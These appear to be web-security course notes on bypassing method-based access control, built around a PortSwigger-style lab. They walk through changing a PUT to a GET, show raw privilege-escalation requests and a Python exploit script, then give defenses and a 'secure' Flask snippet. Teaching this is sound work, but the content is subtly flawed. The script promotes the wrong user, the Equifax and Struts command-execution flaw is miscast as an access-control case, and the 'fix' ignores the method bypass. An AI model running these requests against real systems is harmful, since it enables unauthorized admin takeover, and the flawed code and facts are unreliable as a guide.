---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Access Control Vulnerabilities

### Introduction to Access Control

Access control is a fundamental aspect of web application security. It ensures that users can only access resources and perform actions that they are authorized to do. This is typically achieved through mechanisms such as authentication, authorization, and session management. However, if these mechanisms are implemented incorrectly, they can lead to serious vulnerabilities.

### Method-Based Access Control

Method-based access control is a type of access control that restricts certain HTTP methods (such as GET, POST, PUT, DELETE) to specific users or roles. For example, an application might allow only administrators to use the DELETE method to remove data, while regular users can only use GET and POST methods.

#### How Method-Based Access Control Works

In a typical web application, different HTTP methods are used to perform different types of operations:

- **GET**: Retrieve data.
- **POST**: Submit data to be processed.
- **PUT**: Update existing data.
- **DELETE**: Remove data.

Access control mechanisms ensure that only authorized users can perform these operations. For instance, an administrator might be allowed to delete a user account using the DELETE method, while a regular user would not have this permission.

#### Example Scenario

Consider a web application where an administrator can promote a user to an admin role using a specific endpoint. The application might use the following logic:

- Only users with the `admin` role can use the `PUT` method to promote another user to the `admin` role.
- Regular users can only use the `GET` method to view their own details.

If the application does not properly enforce this access control, an attacker could potentially bypass the restrictions and promote themselves to an admin role.

### Exploiting Broken Access Control

Broken access control occurs when an application fails to properly enforce access control rules. In the scenario described in the lecture, the application allows an attacker to promote themselves to an admin role by changing the HTTP method from `PUT` to `GET`.

#### Step-by-Step Exploitation

Let's break down the steps involved in exploiting this vulnerability:

1. **Identify the Vulnerable Endpoint**:
   - The attacker identifies an endpoint that is supposed to be restricted to admin users, such as `/promoteUser`.
   
2. **Change the HTTP Method**:
   - The attacker changes the HTTP method from `PUT` to `GET`. This can be done using tools like Burp Suite, which allows the attacker to modify HTTP requests.
   
3. **Modify the Request Parameters**:
   - The attacker modifies the request parameters to include the necessary information to promote themselves to an admin role.
   
4. **Send the Modified Request**:
   - The attacker sends the modified request to the server. If the server does not properly enforce access control, the request will be processed as if it were sent by an admin user.

#### Example Code

Here is an example of how the attacker might modify the request using Burp Suite:

```plaintext
Original Request (PUT):
PUT /promoteUser?username=adminUser HTTP/1.1
Host: example.com
Content-Type: application/json

{"username": "attackerUser", "role": "admin"}

Modified Request (GET):
GET /promoteUser?username=adminUser&username=attackerUser&role=admin HTTP/1.1
Host: example.com
```

### Scripting the Exploit in Python

To automate the exploitation process, the attacker can write a Python script that sends the modified request to the server. Here is a complete example of such a script:

```python
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL certificate warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Define the target URL
url = "http://example.com/promoteUser"

# Define the parameters for the GET request
params = {
    "username": "adminUser",
    "role": "admin"
}

# Send the GET request
response = requests.get(url, params=params, verify=False)

# Print the response
print(response.text)
```

### Real-World Examples

Broken access control vulnerabilities have been exploited in several real-world scenarios. One notable example is the Equifax breach in 2017, where attackers exploited a vulnerability in the Apache Struts framework to gain unauthorized access to sensitive data.

#### CVE-2017-5638: Apache Struts Vulnerability

CVE-2017-5638 was a critical vulnerability in the Apache Struts framework that allowed attackers to execute arbitrary commands on the server. This vulnerability was exploited in the Equifax breach, leading to the exposure of sensitive personal data of millions of individuals.

### How to Prevent / Defend Against Broken Access Control

#### Detection

To detect broken access control vulnerabilities, organizations can use automated tools and manual testing techniques:

- **Automated Tools**: Tools like Burp Suite, OWASP ZAP, and Nessus can help identify potential access control issues.
- **Manual Testing**: Penetration testing and code reviews can help identify access control weaknesses that automated tools might miss.

#### Prevention

To prevent broken access control vulnerabilities, organizations should implement the following best practices:

- **Role-Based Access Control (RBAC)**: Implement RBAC to ensure that users can only access resources and perform actions that are appropriate for their roles.
- **Least Privilege Principle**: Ensure that users are granted the minimum level of access necessary to perform their job functions.
- **Input Validation**: Validate all input parameters to ensure that they conform to expected values and formats.
- **Session Management**: Implement proper session management to prevent session hijacking and other related attacks.

#### Secure Coding Fixes

Here is an example of how to securely implement access control in a web application:

```python
# Vulnerable Code
@app.route('/promoteUser', methods=['PUT'])
def promote_user():
    username = request.json['username']
    role = request.json['role']
    # Promote the user to the specified role
    return "User promoted successfully"

# Secure Code
@app.route('/promoteUser', methods=['PUT'])
@requires_admin_role
def promote_user():
    username = request.json['username']
    role = request.json['role']
    # Validate the input parameters
    if not validate_username(username) or not validate_role(role):
        return "Invalid input", 400
    # Promote the user to the specified role
    return "User promoted successfully"
```

### Conclusion

Access control vulnerabilities can have severe consequences for web applications. By understanding how these vulnerabilities can be exploited and implementing proper prevention measures, organizations can significantly reduce the risk of such attacks. Regular testing and code reviews are essential to ensure that access control mechanisms are implemented correctly and effectively.

### Practice Labs

For hands-on practice with access control vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on various web security topics, including access control.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains numerous security vulnerabilities.

By engaging with these labs, you can gain practical experience in identifying and mitigating access control vulnerabilities.

---
<!-- nav -->
[[02-Access Control Vulnerabilities Method-Based Access Control Can Be Circumvented|Access Control Vulnerabilities Method-Based Access Control Can Be Circumvented]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/07-Lab 6 Method based access control can be circumvented/00-Overview|Overview]] | [[04-Analyzing the Vulnerability|Analyzing the Vulnerability]]
